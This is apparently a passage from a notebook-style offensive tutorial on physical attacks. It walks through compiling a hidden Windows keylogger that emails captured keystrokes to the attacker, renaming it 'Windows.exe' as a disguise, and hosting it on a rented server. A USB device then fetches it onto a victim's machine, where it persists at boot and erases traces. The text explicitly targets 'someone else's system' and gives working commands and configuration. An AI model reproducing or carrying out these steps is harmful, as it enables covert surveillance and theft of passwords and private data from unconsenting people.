    "These attacks can be the same thing or have their own areas such as: Sneaking on the site where the systems are and using a variety of lockpick/bypass methods to get tot he target system, using USB keyloggers/rubber ducky's to deploy malware, using drones to scan the site containing the target systems and the drone could have a rapsberry pi attached to scan the WiFi it's near, etc. There a lot of ways to get creative with physical attacks. We'll go over some of them here.\n",

    "*KEEP IN MIND:* When writing code for automatic execution on hardware, delay times could be vastly different depending on how fast the machine you're running the software on is, so it's best to put a delay before initial execution of 2-5 seconds or more if needed and delays between commands of 1-2 seconds. This should ensure that everything will go through on the majority of systems."

    "**USB Keyloger for Windows 7 and up**\n",
    "For this we'll use: an Arduino Tinsy, any standard USB, Arduino IDE, Teensyduino. It's also a good idea to have a copy of Windows, which can be just be a virtual image that you can get for free from microsoft, just google \"windows 10 iso\" and it should be one of the first links(it'll only be a trial though), to test out the exploit and it will be needed for writing the PowerShell scripts.\n",
    "\n",
    "**SetUp for KeyLogger**\n",
    " - Download the Windows 10 VM and run it.\n",
    " - Install CodeBlocks IDE in the Windows 10 VM(the mingw-setup.exe one from the Sourceforge link).\n",
    " - Create a project and make sure to use C++.\n",
    " - Download the keylogger from: https://github.com/Creator69/Keylogger-\n",
    " - Extract the files, open the new project and right-click the project file name.\n",
    " - Add files then add all the header files.\n",
    " - Right click sources and remove it.\n",
    " - Right click project file name and add main file.\n",
    " - Go into the \"SendMail\" file and edit the \"TO\", \"FROM\", and \"PASS\" options at the top with who the email is being sent to(yourself), which account the email is being sent from(yourself), and the password of the email its being sent from(yours).\n",
    " - We're sending it to ourselves because this script is running the keylogger form someone else's system.\n",
    " - Can change the timer for sending emails in the \"KeybHook\" file, in the middle top you'll see a \"Timer Mailtimer ...\" with \"2000 * 60\" for time, which is 2 minutes, this can be changed to anything.\n",
    " - Go to Setting -> Compiler -> Check \"C++11 ISO\" -> Right-click -> New flag\n",
    " - Name can be anything, Compiler flag:`-mwindows`, Linker flag:`-mwindows` , click OK and check the box for it and click OK again \n",
    " - Run it to make sure there's no problems, open task manager and end the task of \"KeyLogger\" in background processes\n",
    " - Exit the program -> save changes -> go into KeyLogger folder -> bin ->DeBug -> copy KeyLogger onto the Desktop\n",
    " \n",
    "**Server Setup for KeyLogger**\n",
    "Need to create this so the keylogger can be downloaded once the USB runs on a system. The script checks if internet is there or not, if it is then it fetches the keylogger, if not it'll sleep until it is and it'll even run at boot time. After running and successfully installing the keylogger, the script will remove itself.\n",
    "\n",
    " - Back in Kali we're going to need to get the RSA keys\n",
    " - Go to where the keys are:`cd /home/user_name/.ssh/`\n",
    " - Move the keys:`mv id_rsa /home/user_name/Documents/`, `mv id_rsa.pub /home/user_name/Documents/`\n",
    " - Create keys: `ssh-keygen -t rsa`, no passphrase needed just skip then generate the key\n",
    " - Cat out the two keys: `cat id_rsa.pub` and `cat id_rsa`\n",
    " - Rent a server from anywhere, DigitalOcean is good since it's pretty cheap for this\n",
    " - In DigitalOcean create a new Droplet, select whatever's best for the rest then click on \"New SSH Key\" and add the id_rsa.pub key there(copy from \"ssh-rsa\" to \"user_name@MyDomain\")\n",
    " - Create and copy the IP address given\n",
    " - In terminal: `ssh root@#.#.#.#` (#.#.#.# is the IP copied), then yes to login\n",
    " - Change the password for root:`passwd` then disable it:`vi /etc/ssh/sshd_config`\n",
    " - Delete the \"#\" symbol before \"Port 22\" and then change the Port number to something else like 60001, go to PasswordAuthentication, remove \"#\" and change from yes to no and comment the second one out \"#\", save and quit\n",
    " - Restart the server: `systemctl restart sshd`, `exit`, login again:`ssh root@#.#.#.# -p 60001` and should now be set to log in this way\n",
    " - Install a webserver: `apt-get install httpd`, check status:`systemctl httpd`, if not running then start it:`systemctl start httpd`\n",
    " - Now when going to the IP address given by DigitalOcean you should see \"Testing 123...\"\n",
    " - Now enable to firewall: `systemctl status firewalld`, if off then start: `systemctl start firewalld`\n",
    " - Add ports to firewall: `firewall-cmd --add-port=60001/tcp --permenant` and `firewall-cmd --add-port=80/tcp --permenant`\n",

    " - Now we'll plug in the USB and transfer the file to the Windows 10 VM, may need to go in terminal and disable SELinux temportarily:`setenforce 0`(this is a runtime and not a permenant change)\n",
    " - Add USB to Windows10 VM, copy and paste the KeyLogger from the VM to the USB then eject it\n",
    " - Unplug the USB, remove it from the Win10 VM, then replug the USB back in\n",
    " - In Kali terminal: `fdisk -l`\n",
    " - Look for the USB by filetype and size then mount it:`mount /dev/sdc# /mnt/`\n",
    " - Go to the USB:`cd /mnt` then `ls`,  you should now see \"Keylogger.exe\"\n",
    " - If permission denied, just copy it to desktop then change permission:`cp Keylogger.exe /home/user_name/Desktop` , then `cd /home/user_name/Desktop`,  then `chown user_name:user_name Keylogger.exe`\n",
    " - Copy this to the server:`scp -P 60001 Keylogger.exe root@#.#.#.#:/root/`\n",
    " - Rename the file:`Keylogger.exe Windows.exe` then move to:`mv Windows.exe /var/www/html/`\n",
    " - Check the download works by going to a browser and going to: `#.#.#.#/Windows.exe`, you should get a prompt to download\n",
    " - Move to:`/var/www/html/`, get the md5 hash:`md5sum Windows.exe`\n",
